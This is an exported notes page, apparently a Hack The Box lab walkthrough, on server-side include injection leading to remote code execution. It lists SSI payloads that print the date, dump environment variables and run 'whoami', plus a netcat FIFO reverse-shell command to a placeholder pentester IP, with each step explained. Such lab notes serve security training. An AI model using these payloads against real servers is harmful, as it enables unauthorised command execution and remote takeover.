<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SSI Injection RCE (HTB)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>SSI Injection RCE (HTB)</h1><br/><br />    <a href=""><img src="images/2571-1.png" alt="images/2571-1.png" /></a><br /><br />1. Send Test Characters<br />    <a href=""><img src="images/2571-2.png" alt="images/2571-2.png" /></a><br />    <a href=""><img src="images/2571-3.png" alt="images/2571-3.png" /></a><br /><br />2. Send some <span style="color:#ff0000;">malicious payloads</span><br />• Date<br />    <div class="codebox"><pre>&lt;!--#echo var=&quot;DATE_LOCAL&quot; --&gt;</pre></div><br />    <a href=""><img src="images/2571-4.png" alt="images/2571-4.png" /></a> <br />    <a href=""><img src="images/2571-5.png" alt="images/2571-5.png" /></a><br />•  Print all variables<br />    <div class="codebox"><pre>&lt;!--#printenv --&gt;</pre></div><br />    <a href=""><img src="images/2571-6.png" alt="images/2571-6.png" /></a><br />    <a href=""><img src="images/2571-7.png" alt="images/2571-7.png" /></a><br />•  Execute Commands<br />    <div class="codebox"><pre>&lt;!--#exec cmd=&quot;whoami&quot; --&gt;</pre></div><br />    <a href=""><img src="images/2571-8.png" alt="images/2571-8.png" /></a><br />    <a href=""><img src="images/2571-9.png" alt="images/2571-9.png" /></a><br /><br />• We can also use the above Command with a Reverse Shell <br />    <div class="codebox"><pre>&lt;!--#exec cmd=&quot;mkfifo /tmp/foo;nc &lt;PENTESTER IP&gt; &lt;PORT&gt; 0&lt;/tmp/foo|/bin/bash 1&gt;/tmp/foo;rm /tmp/foo&quot; --&gt;</pre></div><br />   ◇ mkfifo /tmp/foo →  Create a FIFO special file in /tmp/foo<br />   ◇ nc &lt;IP&gt; &lt;PORT&gt; 0&lt;/tmp/foo →  Connect to the pentester machine and redirect the standard input descriptor<br />   ◇ | bin/bash 1&gt;/tmp/foo → Execute /bin/bash redirecting the standard output descriptor to /tmp/foo<br />   ◇ rm /tmp/foo →  Cleanup the FIFO file<br /><br /><br />       <br /><br /></div>
</body>
</html>
